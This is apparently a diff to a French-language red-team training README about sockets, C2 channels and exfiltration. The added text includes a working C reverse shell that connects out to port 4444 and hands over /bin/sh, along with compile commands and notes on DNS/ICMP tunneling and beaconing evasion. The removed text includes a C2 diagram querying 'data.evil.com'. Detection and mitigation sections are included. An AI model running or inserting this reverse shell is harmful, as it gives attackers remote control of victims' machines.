@@ -1,108 +1,65 @@
-# Module 27 : Networking et Sockets
+# Networking & Sockets - Communication C2 et Exfiltration
 
-## Objectifs d'apprentissage
+Raw sockets, TCP/UDP, reverse shell avancé, DNS tunneling - fondamentaux pour Command & Control (C2), beaconing, exfiltration de données. Techniques utilisées par tous les malwares modernes pour maintenir communication avec l'attaquant.
 
-Ce module explore la programmation réseau en C avec focus sur les techniques de communication pour le red teaming. Vous apprendrez :
+⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.
 
-- **Raw Sockets** : Création de paquets réseau personnalisés
-- **TCP/UDP** : Communication client-serveur
-- **C2 Communication** : Channels de Command & Control
-- **DNS Tunneling** : Exfiltration de données via DNS
+```c
+// Reverse shell TCP classique
+int sock = socket(AF_INET, SOCK_STREAM, 0);
+struct sockaddr_in server = { .sin_family = AF_INET, .sin_port = htons(4444) };
+inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
+connect(sock, (struct sockaddr*)&server, sizeof(server));
 
-## Concepts clés
-
-### Sockets Windows (Winsock)
-- Initialisation avec WSAStartup
-- Création de sockets (socket())
-- Connexion (connect()) et écoute (listen())
-- Envoi/réception de données
-
-### Raw Sockets
-- Accès direct à la couche IP
-- Construction manuelle de headers
-- ICMP, TCP SYN scanning
-- Nécessite privilèges administrateur
-
-### C2 Communication
-- Beacon/callback périodique
-- Commandes encodées/chiffrées
-- Multiple channels (HTTP, DNS, ICMP)
-- Évasion de détection réseau
-
-### DNS Tunneling
-- Encapsulation de données dans des requêtes DNS
-- Bypass de firewalls (port 53 rarement bloqué)
-- Exfiltration furtive
-- Subdomains comme canal de données
-
-## Architecture C2
-
-```
-┌─────────────────────────────────────────────────┐
-│           C2 Communication Flow                 │
-├─────────────────────────────────────────────────┤
-│                                                 │
-│  [Implant/Agent]                                │
-│       │                                         │
-│       ├─→ HTTP Beacon (User-Agent: legit)       │
-│       │   GET /legit-looking-path               │
-│       │                                         │
-│       ├─→ DNS Query (data.evil.com)             │
-│       │   TXT record response                   │
-│       │                                         │
-│       └─→ ICMP Echo Request (data in payload)   │
-│                  │                              │
-│                  ▼                              │
-│          [C2 Server]                            │
-│                  │                              │
-│                  ├─→ Parse command              │
-│                  ├─→ Execute                    │
-│                  └─→ Send results               │
-│                                                 │
-└─────────────────────────────────────────────────┘
+// Redirection stdin/stdout/stderr vers socket
+dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
+execve("/bin/sh", NULL, NULL);
 ```
 
 ## Compilation
 
+### Linux
 ```bash
-# Windows (MinGW)
-gcc -o net_client client.c -lws2_32
-
-# Linux
-gcc -o net_client client.c
-
-# Raw sockets (nécessite admin/root)
-gcc -o raw_socket raw.c -lws2_32
+gcc example.c -o net_client
+gcc example.c -o net_server -DSERVER_MODE
 ```
 
-## ⚠️ AVERTISSEMENT LÉGAL
+### Windows
+```bash
+gcc example.c -o net_client.exe -lws2_32
+gcc example.c -o net_server.exe -lws2_32 -DSERVER_MODE
+```
 
-**UTILISATION RÉSEAU MALVEILLANTE EST ILLÉGALE**
+## Concepts clés
 
-### Autorisé :
-- Lab personnel isolé
-- Environnements de test autorisés
-- Red team engagements légitimes
-- CTF et challenges
+- **Raw Sockets** : Manipulation directe paquets IP/ICMP pour covert channels
+- **Reverse Shell** : Victime initie connexion vers attacker (bypass firewall)
+- **Bind Shell** : Attaquant se connecte vers victime (rare, détecté)
+- **HTTP/HTTPS C2** : Communication via requêtes HTTP (blend in web traffic)
+- **DNS Tunneling** : Exfiltration via requêtes DNS TXT records
+- **ICMP Tunneling** : Données cachées dans ping packets
+- **Beaconing** : Check-in périodique avec jitter pour éviter détection pattern
 
-### INTERDIT :
-- Scan de réseaux non autorisés
-- C2 non autorisé sur infrastructure
-- Exfiltration de données sans permission
-- DDoS ou attaques réseau
+## Techniques utilisées par
 
-**USAGE ÉDUCATIF UNIQUEMENT**
+- **Cobalt Strike** : HTTP/HTTPS beacons, malleable C2 profiles, domain fronting
+- **Metasploit** : Reverse TCP/HTTP/HTTPS stages, meterpreter communication
+- **APT29 (Cozy Bear)** : DNS tunneling pour exfiltration, HTTP C2 via Cloudflare
+- **APT28 (Fancy Bear)** : HTTPS C2 avec certificate pinning, beaconing aléatoire
+- **Emotet** : HTTPS C2, rotation IPs, fallback domains
 
-## Exercices
+## Détection et Mitigation
 
-Consultez `exercice.txt` pour 8 défis progressifs.
+**Indicateurs** :
+- Connexions sortantes vers IPs/ports suspects (non-standard ports)
+- Beaconing patterns réguliers détectés par SIEM
+- DNS queries anormales (long TXT records, random subdomains)
+- ICMP packets avec payload data (ping normal = empty)
+- HTTP User-Agents suspects ou malformés
 
-## Prérequis
-
-- Connaissance des protocoles TCP/IP
-- Bases de la programmation réseau
-- Compréhension des headers réseau
-
----
-
-**RAPPEL** : Tests uniquement sur vos propres réseaux/systèmes autorisés.
+**Mitigations EDR/Firewall** :
+- Firewall egress rules (whitelist sortant)
+- DNS sinkholing pour C2 domains
+- IDS/IPS signatures pour shellcode patterns
+- SSL/TLS inspection (MITM proxy corporatif)
+- Network behavioral analytics pour beaconing detection
